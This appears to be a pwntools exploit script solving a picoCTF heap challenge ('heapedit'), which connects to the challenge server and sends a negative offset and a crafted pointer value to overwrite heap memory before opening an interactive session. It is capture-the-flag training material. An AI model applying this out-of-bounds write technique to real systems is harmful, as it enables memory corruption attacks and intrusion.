from pwn import *

# io = process("./heapedit_patched")
io = remote("mercury.picoctf.net", 31153)
io.recvuntil(b"Address")
address = str(0x6034A0 - 0x602088)
io.sendline(b"-" + address.encode())

io.recvuntil("Value")
io.sendline(p64(0x603800))
io.interactive()
